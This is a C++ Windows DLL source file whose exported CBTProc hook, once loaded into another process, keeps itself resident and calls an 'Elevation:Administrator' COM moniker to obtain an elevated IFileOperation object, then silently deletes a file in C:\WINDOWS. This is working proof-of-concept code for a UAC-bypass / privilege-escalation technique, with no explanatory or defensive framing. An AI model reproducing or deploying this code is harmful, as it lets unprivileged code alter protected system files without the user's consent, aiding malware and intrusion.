// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"

#pragma comment(lib,"Ole32.lib") 
#pragma comment(lib,"User32.lib")
#pragma comment(lib, "Shell32.lib")

HMODULE hModuleGlobal = NULL; // Global variable to hold the module handle

HRESULT CoCreateInstanceAsAdmin(HWND hwnd, REFCLSID rclsid, REFIID riid, void** ppv)
{
	BIND_OPTS3 bo;
	WCHAR wszCLSID[50];
	WCHAR wszMon[300];
	StringFromGUID2(rclsid, wszCLSID, sizeof(wszCLSID) / sizeof(wszCLSID[0]));
	HRESULT hr = StringCchPrintfW(wszMon, sizeof(wszMon) / sizeof(wszMon[0]), L"Elevation:Administrator!new:%s", wszCLSID);
	if (FAILED(hr))
		return hr;
	memset(&bo, 0, sizeof(bo));
	bo.cbStruct = sizeof(bo);
	bo.hwnd = hwnd;
	bo.dwClassContext = CLSCTX_LOCAL_SERVER;
	return CoGetObject(wszMon, &bo, riid, ppv);
}

void ElevatedDelete()
{
	// This is only availabe on Vista and higher
	HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
	IFileOperation* pfo;
	hr = CoCreateInstanceAsAdmin(NULL, CLSID_FileOperation, IID_PPV_ARGS(&pfo));
	pfo->SetOperationFlags(FOF_NO_UI);
	IShellItem* item = NULL;
	hr = SHCreateItemFromParsingName(L"C:\\WINDOWS\\TEST.DLL", NULL, IID_PPV_ARGS(&item));
	pfo->DeleteItem(item, NULL);
	pfo->PerformOperations();
	item->Release();
	pfo->Release();
	CoUninitialize();
}

extern "C" __declspec(dllexport) LRESULT CALLBACK CBTProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    // increase the DLL reference counter to stop unloading.
    if (nCode >= 0 && hModuleGlobal == NULL)
    {
        TCHAR szModulePath[MAX_PATH];
        GetModuleFileName(hModuleGlobal, szModulePath, MAX_PATH);
        hModuleGlobal = LoadLibrary(szModulePath);
        ElevatedDelete();
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
	// unused 
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:       
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}